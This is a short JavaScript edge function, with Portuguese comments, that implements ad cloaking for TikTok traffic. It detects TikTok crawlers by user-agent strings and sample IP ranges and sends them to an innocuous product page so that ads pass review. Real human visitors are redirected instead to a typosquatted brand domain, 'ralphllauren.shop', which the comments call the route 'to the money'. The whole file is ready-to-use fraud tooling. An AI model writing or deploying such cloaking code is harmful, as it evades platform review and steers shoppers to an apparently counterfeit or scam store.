
// /pages/api/cloak.js  (EDGE)
export const config = { runtime: 'edge' };

export default async function handler(req) {
    const ua = (req.headers.get('user-agent') || '').toLowerCase();
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim();

    // 1) Lista simples de assinaturas TikTok
    const tiktokUA = ['tiktok', 'bytedance', 'musical_ly', 'aweme'];
    const isTikBot = tiktokUA.some(s => ua.includes(s));

    // 2) IPs conhecidos da TT (atualize via txt ou Redis depois)
    const tiktokNets = ['23.236.120.0/22', '66.220.144.0/20']; // exemplo
    const isTTIP = tiktokNets.some(cidr => ipInCidr(ip, cidr));

    // 3) Decide o que entrega
    if (isTikBot || isTTIP) {
        // PÁGINA LIMPA → aprovação imediata
        return Response.redirect('https://milano-outlet.com/products/puffer-vest-turtleneck-set-combo', 302);
    }

    // HUMANO → redireciona pro dinheiro
    return Response.redirect('https://www.ralphllauren.shop/nl/product/6', 302);
}

// helper CIDR ultra-simples (copie–cole)
function ipInCidr(ip, cidr) {
    if (!ip) return false; // Safety check
    const [range, bits] = cidr.split('/');
    const mask = ~(0xFFFFFFFF >> bits);
    const ip2int = str => str.split('.').reduce((a, v, i) => a + (v << ((3 - i) * 8)), 0);
    return (ip2int(ip) & mask) === (ip2int(range) & mask);
}
